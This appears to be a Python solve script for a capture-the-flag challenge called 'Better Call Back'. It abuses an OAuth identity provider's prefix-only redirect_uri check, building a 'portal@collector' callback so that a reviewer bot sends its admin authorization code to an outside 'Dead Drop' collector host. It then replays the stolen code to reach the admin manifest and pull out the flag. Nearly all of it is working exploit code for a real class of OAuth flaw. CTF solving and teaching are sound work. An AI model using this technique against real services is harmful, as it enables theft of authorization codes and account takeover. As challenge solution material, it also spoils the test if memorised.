#!/usr/bin/env python3
"""Solve Better Call Back against a deployed challenge instance."""

import argparse
import re
import time
from urllib.parse import parse_qs, urlencode, urlsplit

import requests


def clean(value):
    return value.rstrip("/")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--portal", required=True, help="Portal base URL")
    parser.add_argument("--idp", required=True, help="Browser-visible IdP URL")
    parser.add_argument("--collector", required=True, help="Browser-visible Dead Drop URL")
    args = parser.parse_args()

    portal = clean(args.portal)
    idp = clean(args.idp)
    collector = clean(args.collector)
    collector_netloc = urlsplit(collector).netloc
    if not collector_netloc:
        raise SystemExit("collector must be an absolute URL")

    browser = requests.Session()

    login = browser.get(f"{portal}/login", allow_redirects=False, timeout=8)
    login_location = login.headers["Location"]
    state = parse_qs(urlsplit(login_location).query)["state"][0]
    print(f"[+] OAuth state: {state}")

    mailbox = requests.get(f"{collector}/new", timeout=8).json()
    box = mailbox["box"]
    print(f"[+] Dead Drop box: {box}")

    # The prefix is checked by the IdP; the host after @ is used by the
    # reviewer when it follows the redirect.
    callback = f"{portal}@{collector_netloc}/collect?box={box}"
    authorize = f"{idp}/authorize?" + urlencode({
        "client_id": "supplier-portal",
        "redirect_uri": callback,
        "state": state,
    })
    print(f"[+] Crafted callback: {callback}")

    report = browser.post(f"{portal}/report", data={"url": authorize}, timeout=15)
    if report.status_code != 200:
        raise SystemExit(f"reviewer rejected URL: {report.status_code} {report.text}")
    print("[+] Reviewer accepted and visited authorization URL")

    captured = None
    for _ in range(20):
        entries = requests.get(f"{collector}/mailbox/{box}", timeout=8).json()
        if entries and entries[0].get("code"):
            captured = entries[0]
            break
        time.sleep(0.25)
    if not captured:
        raise SystemExit("no authorization code arrived in Dead Drop")
    print(f"[+] Captured admin code: {captured['code'][:28]}...")

    callback_result = browser.get(
        f"{portal}/callback",
        params={"code": captured["code"], "state": state},
        timeout=8,
    )
    if callback_result.status_code != 200:
        raise SystemExit(f"callback replay failed: {callback_result.status_code}")

    manifest = browser.get(f"{portal}/admin/manifest", timeout=8)
    if manifest.status_code != 200:
        raise SystemExit(f"manifest access failed: {manifest.status_code}")
    match = re.search(r"CYS\{[^}]+\}", manifest.text)
    if not match:
        raise SystemExit("manifest did not contain a CYS flag")
    print(f"[+] Verified flag: {match.group(0)}")


if __name__ == "__main__":
    main()
